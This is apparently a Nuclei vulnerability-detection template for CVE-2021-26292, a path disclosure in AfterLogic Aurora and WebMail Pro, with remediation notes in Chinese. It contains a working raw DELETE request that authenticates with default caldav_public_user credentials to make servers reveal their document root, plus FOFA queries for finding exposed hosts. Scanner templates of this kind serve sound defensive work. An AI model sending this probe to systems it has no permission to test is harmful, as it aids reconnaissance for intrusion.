id: afterlogic-path-disclosure

info:
  name: AfterLogic Aurora 和 WebMail Pro < 7.7.9 - 漏洞（CVE-2021-26292）
  author: johnk3r
  severity: low
  description: |
    该模板用于检测 AfterLogic Aurora 和 WebMail Pro < 7.7.9 - 漏洞（CVE-2021-26292）。该类漏洞通常源于敏感接口、配置文件、错误信息或调试数据被未授权暴露。模板主要向 `/dav/server.php/files/personal/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021` 等路径发送探测请求，并根据响应中的 `caldav_public_user`、`GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可获取路径、配置、账号、令牌、日志或其他敏感信息。
    - 泄露的信息可能被用于定位系统结构、复用凭据、绕过访问控制或辅助后续攻击。
  remediation: |
    - 移除或限制敏感接口、调试页面、配置文件和日志文件的外部访问。
    - 对错误信息和接口响应进行最小化处理，避免返回内部路径、账号、密钥或堆栈信息。
    - 轮换已暴露的凭据和令牌，并检查相关账号的访问记录。
  reference:
    - https://github.com/E3SEC/AfterLogic/blob/main/CVE-2021-26292-full-path-disclosure-vulnerability.md
    - https://nvd.nist.gov/vuln/detail/CVE-2021-26292
  metadata:
    verified: true
    max-request: 1
    vendor: AfterLogic
    product: AfterLogic Aurora & WebMail
    fofa-query:
      - "X-Server: AfterlogicDAVServer"
      - "x-server: afterlogicdavserver"
  tags: afterlogic,path,disclosure,vuln

http:
  - raw:
      - |
        DELETE /dav/server.php/files/personal/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021 HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic Y2FsZGF2X3B1YmxpY191c2VyQGxvY2FsaG9zdDpjYWxkYXZfcHVibGljX3VzZXI

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "caldav_public_user"
          - "GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021"
        condition: and

      - type: word
        part: header
        words:
          - "application/xml"

      - type: status
        status:
          - 404
